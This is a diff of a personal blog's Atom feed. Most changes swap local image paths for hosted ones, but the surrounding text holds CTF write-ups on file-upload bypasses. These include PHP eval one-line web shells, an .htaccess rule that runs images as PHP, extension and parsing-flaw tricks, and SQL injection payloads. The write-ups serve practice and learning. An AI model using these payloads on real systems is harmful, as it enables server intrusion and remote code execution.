@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://z0ekball.github.io</id>
     <title>z0ekball</title>
-    <updated>2022-04-14T14:33:26.942Z</updated>
+    <updated>2022-04-14T14:45:57.714Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://z0ekball.github.io"/>
     <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
@@ -177,7 +177,8 @@ Call system地址<br>
 </code></pre>
 <p>收集可利用poc：多关注新漏洞和已知漏洞，收集脚本，方便利用</p>
 <h4 id="漏洞分析工具">漏洞分析工具</h4>
-<p><code>Windows_Exploit_Suggester</code>：通过下载微软公开漏洞库到本地“生成日期+mssb.xls”文件，然后根据操作系统版本，跟systeminfo生成的文件进行比对，从而发现系统是否存在未修复漏洞。</p>
+<p><code>Windows_Exploit_Suggester</code>：通过下载微软公开漏洞库到本地“生成日期+mssb.xls”文件，<br>
+然后根据操作系统版本，跟systeminfo生成的文件进行比对，从而发现系统是否存在未修复漏洞。</p>
 <pre><code class="language-php">//下载漏洞库
 windows-exploit-suggester.py –update
 //靶机生成系统信息文件
@@ -541,8 +542,8 @@ copy 1.png/b+1.txt/a 2.png
 </code></pre>
 <p><code>二次渲染</code>：同样也是检测文件是否是真的png或gif，上传之后的图片会被二次渲染，使得图马中的一句话木马变成乱码无法执行</p>
 <p><code>绕过方法</code>：下载被二次渲染后的图马与原来的图马比较，找到相同的地方，插入一句话木马。</p>
-<p>（png、jpg、jpeg都不好改，gif好改）</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211018165017388.png" alt="image-20211018165017388" style="zoom: 50%;" />
+<p>（png、jpg、jpeg都不好改，gif好改）<br>
+<img src="https://z0ekball.github.io/post-images/image-20211018165017388.png" alt="" loading="lazy"></p>
 <p>上传图马，配合解析漏洞、文件包含漏洞等使图马以php格式执行即可。</p>
 <h3 id="6解析漏洞">6.解析漏洞</h3>
 <h4 id="00截断攻击">00截断攻击</h4>
@@ -573,34 +574,34 @@ copy 1.png/b+1.txt/a 2.png
 <p>上传一句话木马</p>
 <pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
 </code></pre>
-<p>抓包修改</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019164716089.png" alt="image-20211019164716089" style="zoom:150%;" />
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019164731251.png" alt="image-20211019164731251" style="zoom: 33%;" />
+<p>抓包修改<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019164716089.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/image-20211019164731251.png" alt="" loading="lazy"></p>
 <p>对内容有过滤，换一个木马</p>
 <pre><code class="language-php">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[pass])&lt;/script&gt;
 </code></pre>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165114142.png" alt="image-20211019165114142" style="zoom:150%;" />
-<p>成功</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165418509.png" alt="image-20211019165418509" style="zoom: 33%;" />
-<p>访问该文件upload/2.phtml</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165551551.png" alt="image-20211019165551551" style="zoom:50%;" />
-<p>说明存在该文件，蚁剑连接</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170411685.png" alt="image-20211019170411685" style="zoom:67%;" />
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20211019165114142.png" alt="" loading="lazy"></figure>
+<p>成功<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019165418509.png" alt="" loading="lazy"></p>
+<p>访问该文件upload/2.phtml<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019165551551.png" alt="" loading="lazy"></p>
+<p>说明存在该文件，蚁剑连接<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019170411685.png" alt="" loading="lazy"></p>
 <p>找到flag</p>
 <h3 id="actf2020-新生赛upload1">[ACTF2020 新生赛]Upload1</h3>
-<p><code>前端过滤</code></p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170918935.png" alt="image-20211019170918935" style="zoom: 67%;" />
-<p>把文件改成gif，抓包再改成php</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019171957129.png" alt="image-20211019171957129" style="zoom: 80%;" />
+<p><code>前端过滤</code><br>
+<img src="https://z0ekball.github.io/post-images/image-20211019170918935.png" alt="" loading="lazy"></p>
+<p>把文件改成gif，抓包再改成php<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019171957129.png" alt="" loading="lazy"></p>
 <p>修改<br>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172023103.png" alt="image-20211019172023103" style="zoom:150%;" /></p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172352138.png" alt="image-20211019172352138" style="zoom:67%;" />
-<p>emmmphp也要绕一下改成phtml</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172444434.png" alt="image-20211019172444434" style="zoom:150%;" />
-<p>有了，访问该页面</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172549473.png" alt="image-20211019172549473" style="zoom:80%;" />
-<p>蚁剑一下，用命令行找到flag</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019173439257.png" alt="image-20211019173439257" style="zoom:67%;" />
+<img src="https://z0ekball.github.io/post-images/image-20211019172023103.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/image-20211019172352138.png" alt="" loading="lazy"></p>
+<p>emmmphp也要绕一下改成phtml<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019172444434.png" alt="" loading="lazy"></p>
+<p>有了，访问该页面<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019172549473.png" alt="" loading="lazy"></p>
+<p>蚁剑一下，用命令行找到flag<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019173439257.png" alt="" loading="lazy"></p>
 <h3 id="mrctf2020你传你呢1">[MRCTF2020]你传你🐎呢1</h3>
 <p><code>htaccess绕过</code></p>
 <pre><code class="language-php">//把hack.png解析成php
@@ -608,28 +609,27 @@ copy 1.png/b+1.txt/a 2.png
 SetHandler application/x-httpd-php
 &lt;/FilesMatch&gt;
 </code></pre>
-<p>上传htaccess文件，抓包修改类型为png</p>
-<p><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019180047323.png"
-alt="image-20211019180047323" style="zoom: 100%;" /></p>
-<p>再上传一个含有木马的假png，上传成功</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019175206673.png" alt="image-20211019175206673" style="zoom: 50%;" />
+<p>上传htaccess文件，抓包修改类型为png<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019180047323.png" alt="" loading="lazy"></p>
+<p>再上传一个含有木马的假png，上传成功<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019175206673.png" alt="" loading="lazy"></p>
 <p>蚁剑一下，找到flag</p>
 <h3 id="第二章-web进阶文件上传1">[第二章 web进阶]文件上传1</h3>
 <p>题目直接给出了源码，得到过滤信息：</p>
 <p>1.仅允许上传zip、jpg、gif、png文件<br>
-2.如果上传压缩包，压缩包内不允许含有php文件</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183807280.png" alt="image-20211019183807280" style="zoom:67%;" />
-<p>上传一个含有php的zip</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183103048.png" alt="image-20211019183103048" style="zoom:50%;" />
-<p>要绕过php，改成phtml，上传成功，问题是不知道路径</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183524005.png" alt="image-20211019183524005" style="zoom:67%;" />
-<p>上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下</p>
-<p>010 editor修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）</p>
-<p><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019191350117.png"
-alt="image-20211019191350117" style="zoom:100%;" /></p>
-<p>emmmm，御剑连上了但打不开，文件名换成php.xx(<code>Apache解析漏洞</code>)</p>
-<p>上传后访问，得到flag</p>
-<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019192014051.png" alt="image-20211019192014051" style="zoom:67%;" />]]></content>
+2.如果上传压缩包，压缩包内不允许含有php文件<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019183807280.png" alt="" loading="lazy"></p>
+<p>上传一个含有php的zip<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019183103048.png" alt="" loading="lazy"><br>
+要绕过php，改成phtml，上传成功，问题是不知道路径<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019183524005.png" alt="" loading="lazy"><br>
+上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下<br>
+010 editor修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019191350117.png" alt="" loading="lazy"><br>
+emmmm，御剑连上了但打不开，文件名换成php.xx(<code>Apache解析漏洞</code>)<br>
+上传后访问，得到flag<br>
+<img src="https://z0ekball.github.io/post-images/image-20211019192014051.png" alt="" loading="lazy"></p>
+]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[sqli-labs(11~20)脚本、sqlmap学习]]></title>
@@ -1250,20 +1250,6 @@ User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
 注入点在referer,其他一样</p>
 <h1 id="less-20-cookie漏洞">less-20 (cookie漏洞)</h1>
 <p>注入漏洞：cookie中value值'    #注入</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[关于zyy是只猪这件事]]></title>
-        <id>https://z0ekball.github.io/post/a-sa-da-d/</id>
-        <link href="https://z0ekball.github.io/post/a-sa-da-d/">
-        </link>
-        <updated>2021-03-08T13:13:45.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="众所周知猪的睫毛很长">众所周知，猪的睫毛很长</h2>
-<p>zyy也不例外</p>
-<h2 id="猪猪不爱干净">猪猪不爱干净</h2>
-<p>zyy也是个不爱洗澡的邋遢怪</p>
-<h2 id="猪的毛很卷">猪的毛很卷</h2>
-<p>zyy头上几撮飞毛正是如此</p>
 ]]></content>
     </entry>
 </feed>
